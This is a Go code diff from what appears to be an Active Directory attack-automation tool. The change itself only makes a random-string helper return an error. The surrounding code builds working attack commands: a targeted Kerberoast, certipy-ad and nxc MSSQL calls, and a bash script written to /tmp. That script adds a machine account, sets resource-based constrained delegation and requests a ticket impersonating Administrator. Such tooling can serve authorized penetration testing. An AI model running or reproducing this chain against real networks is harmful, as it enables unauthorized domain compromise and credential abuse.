@@ -410,7 +410,11 @@ func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capabil
 		return exec.CommandContext(ctx, "nxc", append([]string{"mssql"}, args...)...), nil, nil
 
 	case strings.Contains(capLower, "targeted_kerberoast"):
-		spnVal := "HTTP/" + tools.RandString(6)
+		rs, err := tools.RandString(6)
+		if err != nil {
+			return nil, nil, fmt.Errorf("randstring: %w", err)
+		}
+		spnVal := "HTTP/" + rs
 		args := []string{
 			"--host", targetIP, "-d", domain,
 			"-u", user, "-p", pass,
@@ -435,6 +439,7 @@ func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capabil
 		return exec.CommandContext(ctx, "certipy-ad", args...), nil, nil
 
 	case strings.Contains(capLower, "krb_relay_up"):
+		rs2, _ := tools.RandString(12)
 		script := fmt.Sprintf(`#!/bin/bash
 set -e
 DOMAIN=%q
@@ -449,7 +454,7 @@ addcomputer.py -computer-name "$COMPNAME" -computer-pass "$COMPPASS" "$DOMAIN/$U
 rbcd.py -delegate-from "$COMPNAME" -delegate-to "$TARGET" -action write "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
 getST.py -spn "cifs/$TARGET" -impersonate Administrator -dc-ip "$DC" "$DOMAIN/$COMPNAME:$COMPPASS"
 echo "KRBRELAY_SUCCESS"
-`, domain, user, pass, targetIP, targetIP, time.Now().UnixNano()%100000, tools.RandString(12))
+`, domain, user, pass, targetIP, targetIP, time.Now().UnixNano()%100000, rs2)
 		scriptPath := "/tmp/adpack_krbrelay.sh"
 		if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
 			return nil, nil, fmt.Errorf("write krbrelay script: %w", err)
